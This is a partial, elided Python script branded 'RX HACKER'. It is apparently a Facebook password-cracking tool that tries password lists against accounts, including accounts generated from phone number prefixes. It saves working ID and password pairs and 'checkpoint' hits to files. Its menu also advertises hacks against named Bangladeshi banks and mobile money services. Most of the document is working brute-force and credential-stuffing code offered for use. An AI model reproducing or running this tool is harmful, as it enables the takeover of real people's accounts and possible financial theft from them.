...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/RX HACKER.OFFICIAL.ACCOUNT');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mRX HACKER\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[RX HACKER-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/RX HACKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[RX HACKER-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RX HACKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[RX HACKER-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RX HACKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def rifat1():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] Islami Bank Hack \x1b[1;92m[1]')
	print('\x1b[1;97m[2] Grameen Bank Hack \x1b[1;92m[2]')
	print('\x1b[1;97m[3] Sonali Bank Hack \x1b[1;92m[3]')
	print('\x1b[1;97m[4] Draz Bangla Bank Hack  \x1b[1;92m[4]')
	print('\x1b[1;97m[5] Krishi Bank Hack  \x1b[1;92m[5]')
	print('\x1b[1;97m[6] Brack Bank Hack \x1b[1;92m[6]')
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :/bkash/01***,/nogod/01***,/roket/01***,/upay/01***.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR Opinion : ')
	os.system('clear')
	print(logo)
	print(' Example : 10000,20000,30000,****Etc')
	linex()
	limit = int(input('[+] Putt Ypur lemit :  '))
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[RX HACKER-OK] '+cid+' | '+ps+'\033[1;32m')
				open('RX HACKER-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[RX HACKER-CP] '+cid+' | '+ps+'\33[0;97m')
				open('RX HACKER-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
